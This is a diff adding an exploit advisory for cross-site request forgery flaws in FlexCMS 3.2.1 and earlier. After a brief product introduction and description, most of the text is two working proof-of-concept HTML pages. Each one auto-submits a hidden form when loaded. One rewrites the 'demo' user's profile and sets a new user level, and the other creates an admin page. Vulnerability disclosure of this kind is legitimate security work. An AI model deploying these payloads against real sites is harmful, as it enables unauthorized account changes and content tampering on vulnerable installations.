@@ -1,0 +1,112 @@
++---------------------------------------------------------------------------------------------------------------------------------------------------+
+# Exploit Title    : FlexCMS 3.2.1 Multiple CSRF
+# Date             : 16-03-2012
+# Author           : Ivano Binetti (http://www.ivanobinetti.com)
+# Software link    : http://www.flexcms3.com/index.php/index.html
+# Vendor site      : http://www.flexcms.com
+# Version          : 3.2.1 (and lower)
+# Tested on        : Debian Squeeze (6.0) 
+# Original Advisory: http://ivanobinetti.blogspot.com/2012/03/flexcms-multiple-csrf-vulnerabilities.html
+
++---------------------------------------------------------------------------------------------------------------------------------------------------+
+Summary
+
+1)Introduction
+2)Vulnerabilities Description 
+3)Exploit
+ 3.1 Exploit (Change Settings of "demo" user)
+ 3.2 Exploit (Add Page)
+
++---------------------------------------------------------------------------------------------------------------------------------------------------+
+
+1)Introduction
+FlexCMS "is a user-friendly website content management system.  With FlexCMS you can easily build dynamic websites within a matter of minutes
+with just the click of your mouse!  Maintain your web content, navigation and even limit what groups or specific users can access, from anywhere in 
+the world with just a web browser!  With an emphasis on security and functionality, FlexCMS is a professional and robust system suitable for any 
+business or organization website. Built on the PHP programming language and the MySQL database, FlexCMS delivers superb performance on any size 
+website.".
+
+2)Vulnerability Description 
+FlexCMS 3.2.1 suffers from multiple CSRF vulnerabilities which could allow an attacker to change any parameters when an authenticated user/admin
+browses a special crafted web page. In this Advisory I've only demonstrate how to change settings of user "demo" (is default user of demo page)
+and also I've created a new web page.
+
+
+3)Exploit 
+
+ 3.1 Exploit (Change settings of "demo" user)
+ <html>
+ <body onload="javascript:document.forms[0].submit()">
+ <H2>CSRF Exploit to add change any network parameter</H2>
+ <form method="POST" name="form0" action="http://SERVER/index.php/profile-edit-save">
+ <input type="hidden" name="UsernameToEdit" value="demo"/>
+ <input type="hidden" name="Username" value="demo"/>
+ <input type="hidden" name="DisplayName" value="Ivano Binetti"/>
+ <input type="hidden" name="RealName" value="Ivano Binetti"/>
+ <input type="hidden" name="Email" value="IvanoBinetti@flexcms.com"/>
+ <input type="hidden" name="DisplayEmail" value="y"/>
+ <input type="hidden" name="Location" value=""/>
+ <input type="hidden" name="Password1" value=""/>
+ <input type="hidden" name="Password1" value=""/>
+ <input type="hidden" name="FirstName" value="Demo"/>
+ <input type="hidden" name="LastName" value="Demo"/>
+ <input type="hidden" name="OrganizationCompany" value=""/>
+ <input type="hidden" name="Address1" value=""/>
+ <input type="hidden" name="Address2" value=""/>
+ <input type="hidden" name="City" value="AnyCity"/>
+ <input type="hidden" name="StateProvince" value=""/>
+ <input type="hidden" name="ZipPostal" value=""/>
+ <input type="hidden" name="Country" value="US"/>
+ <input type="hidden" name="Phone" value=""/>
+ <input type="hidden" name="Website" value=""/>
+ <input type="hidden" name="ReferredBy" value=""/>
+ <input type="hidden" name="ForumAvatar" value=""/>
+ <input type="hidden" name="FileData" value=""/>
+ <input type="hidden" name="ForumSignature" value=""/>
+ <input type="hidden" name="NewUserLevel" value="20"/>
+ </form>
+ </body>
+ </html>
+
+
+ 3.2 Exploit (Add Page)
+ <html>
+ <body onload="javascript:document.forms[0].submit()">
+ <H2>CSRF Exploit to add web page</H2>
+ <form method="POST" name="form0" action="http://SERVER/index.php/admin/pages-new-save">
+ <input type="hidden" name="AdminLabel" value="1"/>
+ <input type="hidden" name="PageCategory" value="0"/>
+ <input type="hidden" name="PageLink" value="testissimo"/>
+ <input type="hidden" name="PageTitle" value="testissimo"/>
+ <input type="hidden" name="TitleImage" value=""/>
+ <input type="hidden" name="TitleAlignment" value="L"/>
+ <input type="hidden" name="PageType" value="1"/>
+ <input type="hidden" name="EnablePHP" value="0"/>
+ <input type="hidden" name="PageContents" value="%3Cdiv%3Etestissimo%3C%2Fdiv%3E"/>
+ <input type="hidden" name="PageContents2" value=""/>
+ <input type="hidden" name="PageAlignment" value="L"/>
+ <input type="hidden" name="BrowserTitle" value=""/>
+ <input type="hidden" name="MetaKeywords" value=""/>
+ <input type="hidden" name="MetaDescription" value=""/>
+ <input type="hidden" name="PageEnabled" value="1"/>
+ <input type="hidden" name="MinLevel" value="1"/>
+ <input type="hidden" name="MinEditLevel" value="0"/>
+ <input type="hidden" name="SDMonth" value="1"/>
+ <input type="hidden" name="SDDay" value="1"/>
+ <input type="hidden" name="SDYear" value="2012"/>
+ <input type="hidden" name="SDHour" value="0"/>
+ <input type="hidden" name="SDMinute" value="0"/>
+ <input type="hidden" name="SDAmPm" value="am"/>
+ <input type="hidden" name="EDMonth" value="1"/>
+ <input type="hidden" name="EDDay" value="1"/>
+ <input type="hidden" name="EDYear" value="2012"/>
+ <input type="hidden" name="EDHour" value="0"/>
+ <input type="hidden" name="EDMinute" value="0"/>
+ <input type="hidden" name="EDAmPm" value="am"/>
+ <input type="hidden" name="SubmitButton" value="Create+New+Page"/>
+ </form>
+ </body>
+ </html>
+
+
++--------------------------------------------------------------------------------------------------------------------------------------------------+
